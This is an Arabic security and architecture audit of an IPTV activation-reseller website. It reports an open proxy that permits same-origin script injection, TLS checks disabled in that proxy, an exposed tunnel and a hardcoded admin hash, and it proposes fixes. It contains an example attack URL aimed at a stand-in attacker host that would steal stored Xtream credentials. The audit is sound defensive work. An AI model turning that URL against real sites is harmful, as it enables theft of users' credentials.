## 1. الخلاصة التنفيذية

المشروع **ناضج تقنياً أكثر من المتوقع** لموقع متجر/محتوى: بناء حتمي (deterministic)، 775 صفحة مولّدة مسبقاً، 484 اختبار منطق، 167 اختبار واجهة، فصل واضح بين المصدر والمخرجات، رؤوس أمان، توثيق استثنائي، وSEO منظم. شغّلت `typecheck` و`test` و`build` بنجاح، وأعد البناء إنتاج نفس الملفات تماماً (صفر فروق في Git).

لكن المشروع **ليس جاهزاً بعد كنظام تجاري مؤتمت**، وهناك خمس نقاط يجب معالجتها قبل أي حملة تسويقية جديدة:

| # | الخطر | لماذا الآن |
|---|---|---|
| 1 | **حقن JavaScript من نفس الأصل عبر `/proxy.php`** | الوسيط يجلب أي رابط عام ويعيد محتواه بنوعه الأصلي (HTML ممكن)، وسياسة الموقع تسمح بالسكربتات المضمّنة. يمكن لرابط واحد أن يقرأ `localStorage` (وفيه بيانات حسابات Xtream) أو ينفّذ طلبات بجلسة المدير. |
| 2 | **تعطيل التحقق من شهادة TLS في `proxy.php`** | `CURLOPT_SSL_VERIFYPEER=false` و`VERIFYHOST=0` مع تمرير أسماء مستخدمين وكلمات مرور وروابط بث — أي وسيط شبكي يمكنه اعتراضها. |
| 3 | **تضمين مشغّل خارجي من نفس أصل الموقع** | `/embed.php` يخدم HTML طرف ثالث تحت نطاق الموقع، وسياسة المستند تسمح بـ`unsafe-inline` و`unsafe-eval`. أي خلل/استيلاء على نفق Cloudflare يعطي صلاحية كاملة على أصل الموقع. |
| 4 | **ادعاءات غير قابلة للإثبات في صفحات البيع** | «4.95/5 — 4,820 تقييم موثق»، «+45,000 مستخدم»، «ثبات 99.9%»، «دعم 24/7 متوسط الرد <3 دقائق»، «تفعيل آلي عبر واتساب والبريد» — لا يوجد مصدر أو نظام يثبتها، وبعضها يخالف سياسة الاسترجاع. |
| 5 | **صفحة حالة الخدمة غير حقيقية** | صفحة ثابتة تعرض 5 سيرفرات (منها 4 باسم «ايستار»)، «آخر تحديث 22/6/2026»، وتدّعي التحديث كل 60 ثانية. وهي مفهرسة وموجودة في `sitemap.xml`. |

**التقييم المختصر:** الموقع التسويقي والمحتوى: **8/10**. البنية والتوثيق والاختبارات: **8/10**. الأمان التشغيلي: **4/10**. الجاهزية كنظام بيع/دعم مؤتمت: **4/10**. الامتثال والادعاءات التسويقية: **4/10**.

## 2. ما هو المشروع فعلياً؟

### 2.1 الوصف التجاري كما هو منشور

- **العلامة:** ستريم ماستر برو / Stream Master Pro — `streammasterstore.com`.
- **المنتج المعلن:** «باقات تفعيل وربط تقني» لاشتراكات صادرة عن **مزوّدين خارجيين مستقلين** (نوفا، إيستار، موكا)، مع إعداد المشغّل على أجهزة العميل ودعم فني.
- **ما ينفيه الموقع صراحة:** استضافة المحتوى أو بثه أو إعادة بثه، وبيع قنوات مشفّرة. النص الرسمي في التذييل وصفحة الشروط يصف الموقع كـ«وسيط تقني ودليل فهرسة».
- **القنوات الرسمية:** واتساب `+20 109 895 0879`، وبريد `support@streammasterstore.com`.
- **الأسواق المستهدفة:** السعودية والخليج ومصر، بواجهة عربية أساسية وإنجليزية جزئية.

### 2.2 نموذج العمل الفعلي (المهم)

الموقع **ليس متجراً إلكترونياً مكتملاً**. المسار المنفَّذ فعلياً:

1. العميل يتصفّح، يختار الباقة، يضيفها إلى السلة.
2. السلة تُحفظ في `localStorage` داخل متصفح العميل فقط.
3. زر «إتمام الطلب» يفتح **WhatsApp** برسالة جاهزة فيها الباقات والإجمالي.
4. لا يُنشأ طلب على الخادم، ولا يوجد حساب عميل، ولا بوابة دفع، ولا بريد تلقائي.
5. التفعيل والدفع وتسليم بيانات المزوّد يتمان **يدوياً** خارج الموقع.

هذه ليست تفاصيل تقنية فقط؛ هي أساس رسالة الموظفين: **لا يوجد نظام طلبات مركزي**، والسلة ليست طلباً حتى تصل رسالة واتساب ويؤكدها الفريق.

## 3. المعمارية والتقنيات

```
الزائر
  │
  ├── HTML مولّد مسبقاً (SSR/prerender) في جذر المستودع
  │      └── React 19 + Vite 7 + Tailwind 4 (موقع ثابت)
  │
  ├── /scoreboard.php      → ESPN + TheSportsDB (مباريات)
  ├── /match-center.php    → ESPN (مركز المباراة)
  ├── /standings.php       → ESPN + Highlightly (جداول)
  ├── /proxy.php           → وسيط HLS/M3U/Xtream (Cloudflare Worker بديل)
  ├── /embed.php           → وسيط مشغّل خاص (/player/…)
  └── /go.php              → تتبّع نقرات الشركاء
```

| الطبقة | التقنية | ملاحظات |
|---|---|---|
| الواجهة | React 19.2، Vite 7، Tailwind 4 | SSR + hydration، RTL/LTR |
| الأصول | hls.js 1.7، mpegts.js 1.8 (تحميل كسول) | مشغّل الاشتراك في المتصفح |
| البناء | `vite build` + `vite build --ssr` + `prerender.mjs` + `publish-static.mjs` | يكتب 775 مساراً + 404 + sitemap |
| الاستضافة | Hostinger (PHP + LiteSpeed) | نشر ثابت من جذر المستودع + PHP للواجهات |
| CI/CD | GitHub Actions | تحقق + بناء + رفع FTP إلى Hostinger |
| الاختبارات | Node test + Playwright | 484 اختبار منطق + 167 اختبار واجهة |
| البيانات | ESPN، TheSportsDB، Highlightly | لقطات ترتيب وأرشيف مباريات موثّق |
| التحليلات | GA4 `G-N7VT67MW57`، AdSense `ca-pub-8373438380621206` | بدون CMP موثّق |
| الإشعارات | OneSignal worker فقط | **غير محمّل في أي صفحة** |

### 3.1 نقاط القوة المعمارية

- **مصدر واحد للحقيقة:** `site.mjs` للنطاق والبريد، `navigation.mjs` للهيدر، `data.ts` للأسعار، `seo.ts` لبيانات SEO.
- **بناء حتمي:** أعدت `npm run build` فلم يتغير أي ملف متتبَّع (`git status` نظيف).
- **فصل واضح:** `website/` مصدر التطوير، وجذر المستودع مخرجات النشر + PHP + بيانات. لا يُحرَّر HTML المولّد يدوياً.
- **SSR حقيقي:** المحتوى يظهر بلا JavaScript، والتفاعل طبقة فوقه.
- **PHP محدود الصلاحيات:** `match-center.php` لا يقبل رابطاً أو معرّف حدث من الزائر، بل سلاجاً من قائمة مغلقة.
- **SSRF:** فحص المخطط والمنفذ وكل عناوين DNS ومنع النطاقات الخاصة — موجود في `proxy.php` و`embed.php`.

## 9. الأمان — النتائج مرتبة بالخطورة

### 🔴 P0-1: حقن سكربت من نفس الأصل عبر `/proxy.php`

**الدليل:**

- `proxy.php` يقبل `?url=` / `?u=` / `?b64=` **لأي مضيف عام** (قائمة `ALLOWED_DOMAINS` معرّفة لكنها لا تُطبَّق؛ تعليق `embed.php` يؤكد أنها كانت «توثيقية»).
- في المسار الافتراضي (غير `player_api` وغير `.m3u8`) يمرّر **نوع المحتوى الأصلي** (`content-type`) ويبثّ الجسم.
- `.htaccess` يضبط `script-src 'self' 'unsafe-inline'`، أي أن أي HTML يُخدم من نفس الأصل يستطيع تنفيذ JavaScript.

**الأثر:** رابط مثل `/proxy.php?url=https://attacker.example/x.html` يعطي المهاجم JS على أصل `streammasterstore.com`. هذا يقرأ:

- `localStorage['smp-xtream-accounts']` — **أسماء مستخدمين وكلمات مرور Xtream بنص صريح** (`website/src/lib/xtream.mjs`).
- `localStorage['stream-master-cart']` وتفضيلات العميل.
- ويمكنه إرسال طلبات بجلسة المدير إذا فتح المدير الرابط (كوكي `SMP_ADMIN` مساره `/admin-dashboard/` ويُرسل مع طلبات fetch من أي صفحة على الأصل).

**الإصلاح المقترح:**

1. منع أي استجابة `text/html` أو `application/xhtml+xml` من الوسيط، أو إجبار `Content-Type: application/octet-stream` + `Content-Disposition: attachment`.
2. تطبيق allowlist للمضيفين (أو توقيع روابط قصير العمر لكل مزوّد) بدل «أي مضيف عام».
3. إضافة `Content-Security-Policy: sandbox; default-src 'none'` على استجابات الوسيط، أو نقله إلى نطاق فرعي منفصل.
4. اختبار انحدار يثبت أن `?url=https://example.com/x.html` لا يعيد HTML.

### 🔴 P0-2: تعطيل التحقق من TLS في وسيط البث

**الدليل:** `proxy.php:363-364`:

```php
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_SSL_VERIFYHOST => 0,
```

**الأثر:** كل بيانات اعتماد Xtream (تُرسل في مسار URL) ورموز الجلسات والمقاطع تمرّ عبر اتصال قابل للاعتراض. هذا يتعارض مع بقية الملفات التي تستخدم `VERIFYPEER => true` (`embed.php`, `standings.php`, `espn_source.php`).

**الإصلاح:** التحقق مفعّل افتراضياً، مع قائمة استثناءات صريحة لمزوّدين محددين إن لزم، وتوثيق الخطر. لا تعطيل عام.

### 🔴 P0-3: مشغّل خارجي تحت نفس الأصل + نفق مكشوف وميت

**الدليل:**

- `stream-embed.conf` يحتوي نفقاً حياً: `https://happen-feof-occurring-impacts.trycloudflare.com`.
- `player.html` يضمّن `/player/five_channels_full.html` (نفس الأصل).
- `embed.php` يعيد كتابة HTML الطرف الثالث ويخدمه تحت النطاق نفسه، مع `script-src 'unsafe-inline' 'unsafe-eval'`.
- الملف `stream-embed.conf` **قابل للتنزيل علناً** (غير محظور في `.htaccess`)، والنفق لم يستجب عند الاختبار (`curl` أعاد `000`).

**الأثر:** أي استيلاء/خلل في نفق Cloudflare = JavaScript كامل على أصل الموقع (نفس أثر P0-1)، إضافة إلى تعطّل `/player.html` حالياً. النفق المؤقت غير مناسب للإنتاج، ورابطه المكشوف يسهّل استهداف المحتوى.

**الإصلاح:** استضافة المشغّل على نطاق فرعي منفصل أو إزالته؛ إن بقي، ضعه في iframe مع `sandbox="allow-scripts allow-forms allow-popups"` **بدون** `allow-same-origin`، وامنع تحميل `stream-embed.conf` علناً، ولا تلتزم نفقاً مؤقتاً في المستودع.

### 🟠 P1-4: `proxy.php` وسيط مفتوح للعالم

لا allowlist فعلي ولا توقيع. أي شخص (خارج المتصفح) يستطيع استخدام خادمك لجلب أي عنوان عام: استهلاك نطاق ترددي، إخفاء هوية، وسمعة IP. `Referer` في `.htaccess` قابل للتزوير.

**الإصلاح:** allowlist + token لكل جلسة، وحدود نطاق ترددي، ومراقبة.

### 🟠 P1-5: لوحة التحكم «واجهة فقط» وليست نظام إدارة

**الدليل:** `admin-dashboard/private/_dashboard.html` يحفظ كل شيء في `localStorage`:

`admin-site-settings`, `admin-articles`, `admin-prices`, `admin-changes-log`, `stream-master-admin-stats`.

لا يوجد أي طلب إلى الخادم. تغيير السعر أو نشر مقال من اللوحة **لا يؤثر على الموقع المنشور**. اللوحة تحتوي أيضاً على GA4 وAdSense داخل منطقة إدارية خاصة.

**الإصلاح:** إما ربطها بـ API/قاعدة بيانات، أو تسميتها «معاينة محلية» وإزالتها من الإنتاج، وإزالة الإعلانات منها.

### 🟠 P1-6: كلمة مرور الإدارة داخل الكود

`ADMIN_HASH` و`ADMIN_SALT` ثابتان في `admin-dashboard/index.php`، مع تعليق يشير إلى `NEW_ADMIN_PASSWORD.txt` غير الموجود. لا 2FA. الحماية الجيدة (PBKDF2 200k، CSRF، قفل 5 محاولات، جلسة 4 ساعات) لا تعوّض سراً داخل المستودع.

**الإصلاح:** نقل الهاش إلى متغير بيئة، تدوير كلمة المرور، وإضافة 2FA إن أمكن.

### 🟠 P1-7: ملفات إعداد مكشوفة

`stream-embed.conf` (رابط النفق)، `affiliates.json` (روابط الشركاء)، `clicks.json` (إحصاءات) — كلها في جذر النشر وغير محظورة في `.htaccess`. ليست أسراراً عالية، لكن كشف النفق وبنية الشركاء لا داعي له.

**الإصلاح:** حظر `.conf` و`.json` غير العامة في `.htaccess`، أو نقلها خارج `public_html`.

### 🟡 P2: ملاحظات أمان إضافية

- `X-Frame-Options` وCSP مضبوطان، لكن `unsafe-inline` يضعف الحماية.
- `Permissions-Policy` جيد.
- `go.php` يحمي من Open Redirect ويجزّئ IP — جيد.
- `scoreboard.php`/`standings.php` يستخدمان allowlist وcache وrate limit — جيد.
- `admin-dashboard/.htaccess` يمنع الوصول المباشر للوحة — جيد.
- `CURLOPT_SSL_VERIFYPEER` صحيح في كل الملفات عدا `proxy.php`.
- لا فحص `npm audit` في CI، ولا تثبيت Actions بـSHA.
- ملفات rate-limit في `/tmp` لا تُنظَّف دورياً.
- لا توجد حماية CSRF على عمليات لوحة التحكم لأنها لا تنفذ عمليات خادم أصلاً.
